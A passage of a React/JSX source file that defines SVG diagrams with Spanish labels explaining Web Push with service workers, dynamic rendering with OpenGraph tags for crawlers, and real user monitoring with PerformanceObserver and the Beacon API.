      <text x="115" y="174" fill="#1e40af" fontSize="6.5" fontWeight="bold" textAnchor="middle">Disparo Asíncrono de Evento</text>

      <text x="210" y="120" fill="#3b82f6" fontSize="14" fontWeight="bold">➔</text>

      {/* Step 2: Browser Push Service */}
      <rect x="235" y="50" width="170" height="135" rx="8" fill={isDark ? "#431407" : "#fff7ed"} stroke="#f97316" strokeWidth="1.5" />
      <text x="320" y="68" fill="#f97316" fontWeight="bold" fontSize="9" textAnchor="middle">2. Push Service del Fabricante</text>
      <text x="245" y="88" fill={textColor} fontSize="7">• Google FCM / Mozilla autopush / Apple</text>
      <text x="245" y="102" fill={textColor} fontSize="7">• Valida la firma VAPID</text>
      <text x="245" y="116" fill="#ea580c" fontSize="7" fontWeight="bold">• Enruta la notificación al dispositivo</text>
      <text x="245" y="132" fill={subtextColor} fontSize="6.5">• Funciona incluso si el browser está cerrado</text>
      <text x="320" y="174" fill="#c2410c" fontSize="6.5" fontWeight="bold" textAnchor="middle">Infraestructura del SO</text>

      <text x="415" y="120" fill="#f97316" fontSize="14" fontWeight="bold">➔</text>

      {/* Step 3: Client Service Worker */}
      <rect x="440" y="50" width="170" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="525" y="68" fill="#10b981" fontWeight="bold" fontSize="9" textAnchor="middle">3. Service Worker en Cliente</text>
      <rect x="450" y="80" width="150" height="40" rx="3" fill="#d1fae5" />
      <text x="455" y="94" fill="#047857" fontSize="6" fontFamily="monospace">self.addEventListener(&apos;push&apos;, e =&gt; &#123;</text>
      <text x="455" y="105" fill="#047857" fontSize="6" fontFamily="monospace">  self.registration.showNotification(</text>
      <text x="455" y="116" fill="#047857" fontSize="6" fontFamily="monospace">    title, options); &#125;);</text>
      <text x="450" y="138" fill="#10b981" fontSize="7" fontWeight="bold">• Muestra banner nativo en el SO</text>
      <text x="450" y="151" fill={textColor} fontSize="6.5">• notificationclick abre la app</text>
      <text x="525" y="174" fill="#059669" fontSize="6.5" fontWeight="bold" textAnchor="middle">Engagement en Pantalla de Bloqueo</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Web Push desacopla la entrega mediante VAPID y el Push Service del navegador; el Service Worker despierta en segundo plano y muestra la notificación.</text>
    </svg>
  );
  },

  "webapp-seo-dynamic-rendering": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">SEO Técnico en SPAs: Dynamic Rendering &amp; OpenGraph Metadata</text>

      {/* Left: User Request */}
      <rect x="30" y="50" width="180" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eff6ff"} stroke="#3b82f6" strokeWidth="1.5" />
      <text x="120" y="68" fill="#3b82f6" fontWeight="bold" fontSize="9.5" textAnchor="middle">1. Usuario Humano (Chrome/Safari)</text>
      <text x="40" y="88" fill={textColor} fontSize="7">• Motor JavaScript completo disponible</text>
      <text x="40" y="102" fill={textColor} fontSize="7">• Recibe el bundle SPA reactivo</text>
      <rect x="40" y="115" width="160" height="24" rx="3" fill="#dbeafe" />
      <text x="120" y="130" fill="#1e40af" fontSize="6.5" fontWeight="bold" textAnchor="middle">Navegación Client-Side Fluida</text>
      <text x="40" y="152" fill={subtextColor} fontSize="6.5">Experiencia interactiva completa</text>
      <text x="120" y="174" fill="#3b82f6" fontSize="7" fontWeight="bold" textAnchor="middle">Rutas Reactivas</text>

      {/* Center: Edge Detection */}
      <rect x="230" y="50" width="180" height="135" rx="8" fill={isDark ? "#311042" : "#fdf4ff"} stroke="#c026d3" strokeWidth="1.5" />
      <text x="320" y="68" fill="#c026d3" fontWeight="bold" fontSize="9.5" textAnchor="middle">2. User-Agent Detection en Edge</text>
      <rect x="240" y="80" width="160" height="38" rx="3" fill={isDark ? "#4c1d95" : "#ede9fe"} />
      <text x="320" y="94" fill="#a855f7" fontSize="6.5" fontWeight="bold" textAnchor="middle">¿Es un Bot / Crawler?</text>
      <text x="320" y="106" fill="#c026d3" fontSize="6" textAnchor="middle">Googlebot, Twitterbot, LinkedIn, WhatsApp</text>
      <text x="240" y="132" fill={textColor} fontSize="7">• Los bots de redes sociales NO ejecutan JS</text>
      <text x="240" y="146" fill="#c026d3" fontSize="7" fontWeight="bold">• Si solo hay SPA, no leen meta tags</text>
      <text x="320" y="174" fill="#9333ea" fontSize="6.5" fontWeight="bold" textAnchor="middle">Bifurcación de Tráfico</text>

      {/* Right: Prerendered HTML for Bots */}
      <rect x="430" y="50" width="180" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="520" y="68" fill="#10b981" fontWeight="bold" fontSize="9.5" textAnchor="middle">3. Servido a Bots (SSR / Prerender)</text>
      <rect x="440" y="80" width="160" height="40" rx="3" fill="#d1fae5" />
      <text x="445" y="93" fill="#047857" fontSize="6" fontFamily="monospace">&lt;meta property=&quot;og:title&quot; ...&gt;</text>
      <text x="445" y="103" fill="#047857" fontSize="6" fontFamily="monospace">&lt;meta property=&quot;og:image&quot; ...&gt;</text>
      <text x="445" y="114" fill="#047857" fontSize="6" fontFamily="monospace">&lt;h1&gt;Contenido indexable&lt;/h1&gt;</text>
      <text x="440" y="136" fill="#10b981" fontSize="7" fontWeight="bold">✓ Tarjetas de vista previa ricas</text>
      <text x="440" y="149" fill={textColor} fontSize="6.5">• 100% indexable por buscadores</text>
      <text x="520" y="174" fill="#059669" fontSize="7" fontWeight="bold" textAnchor="middle">SEO Óptimo Garantizado</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Las redes sociales y muchos crawlers no ejecutan JavaScript; el renderizado dinámico en servidor inyecta las etiquetas OpenGraph para previsualizaciones ricas.</text>
    </svg>
  );
  },

  "webapp-telemetry-real-user-monitoring": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Telemetría &amp; Real User Monitoring (RUM) con PerformanceObserver</text>

      {/* Step 1: In-Browser Observer */}
      <rect x="30" y="50" width="180" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eff6ff"} stroke="#3b82f6" strokeWidth="1.5" />
      <text x="120" y="68" fill="#3b82f6" fontWeight="bold" fontSize="9.5" textAnchor="middle">1. PerformanceObserver API</text>
      <rect x="40" y="80" width="160" height="40" rx="4" fill={isDark ? "#1e3a8a" : "#dbeafe"} />
      <text x="45" y="93" fill="#1e40af" fontSize="6" fontFamily="monospace">new PerformanceObserver(list =&gt; &#123;</text>
      <text x="45" y="104" fill="#1e40af" fontSize="6" fontFamily="monospace">  for (const entry of list.getEntries())</text>
      <text x="45" y="115" fill="#1e40af" fontSize="6" fontFamily="monospace">    reportMetric(entry); &#125;);</text>
      <text x="40" y="136" fill={textColor} fontSize="7">• Observa LCP, INP, CLS y LongTasks</text>
      <text x="40" y="150" fill="#10b981" fontSize="7" fontWeight="bold">• Cero sobrecarga de polling en CPU</text>
      <text x="120" y="174" fill="#3b82f6" fontSize="6.5" fontWeight="bold" textAnchor="middle">Medición Nativa en Browser</text>

      {/* Step 2: Beacon Delivery */}
      <rect x="230" y="50" width="180" height="135" rx="8" fill={isDark ? "#311042" : "#fdf4ff"} stroke="#c026d3" strokeWidth="1.5" />
      <text x="320" y="68" fill="#c026d3" fontWeight="bold" fontSize="9.5" textAnchor="middle">2. Envío sin Bloqueo: Beacon API</text>
      <rect x="240" y="80" width="160" height="34" rx="4" fill={isDark ? "#4c1d95" : "#ede9fe"} />
      <text x="245" y="95" fill="#a855f7" fontSize="6.5" fontFamily="monospace">navigator.sendBeacon(&apos;/analytics&apos;,</text>
      <text x="245" y="106" fill="#a855f7" fontSize="6.5" fontFamily="monospace">  JSON.stringify(&#123; metric, val &#125;));</text>
      <text x="240" y="128" fill={textColor} fontSize="7">• Envío garantizado al cerrar la pestaña</text>
      <text x="240" y="141" fill="#c026d3" fontSize="7" fontWeight="bold">• No compite con el ancho de banda crítico</text>
      <text x="240" y="154" fill={subtextColor} fontSize="6.5">Prioridad baja asíncrona de fondo</text>
      <text x="320" y="174" fill="#9333ea" fontSize="6.5" fontWeight="bold" textAnchor="middle">Telemetría Confiable</text>

      {/* Step 3: Observability Dashboard */}
      <rect x="430" y="50" width="180" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="520" y="68" fill="#10b981" fontWeight="bold" fontSize="9.5" textAnchor="middle">3. Dashboard RUM en Producción</text>
      <rect x="440" y="80" width="160" height="42" rx="4" fill="#d1fae5" />
      <text x="445" y="95" fill="#047857" fontSize="7" fontWeight="bold">Percentil 75 (p75) Real:</text>
      <text x="445" y="106" fill="#065f46" fontSize="6.5">LCP: 1.8s | INP: 85ms | CLS: 0.02</text>
      <text x="445" y="117" fill="#10b981" fontSize="6.5" fontWeight="bold">94% de usuarios con experiencia BUENA</text>
      <text x="440" y="140" fill={textColor} fontSize="7">• Segmentado por dispositivo y país</text>
      <text x="440" y="153" fill={textColor} fontSize="7">• Alertas inmediatas ante degradaciones</text>
      <text x="520" y="174" fill="#059669" fontSize="6.5" fontWeight="bold" textAnchor="middle">Decisiones Guiadas por Datos Reales</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Real User Monitoring (RUM) captura el rendimiento real de usuarios en producción utilizando PerformanceObserver y la Beacon API sin penalizar la UX.</text>
    </svg>
  );
  }
};
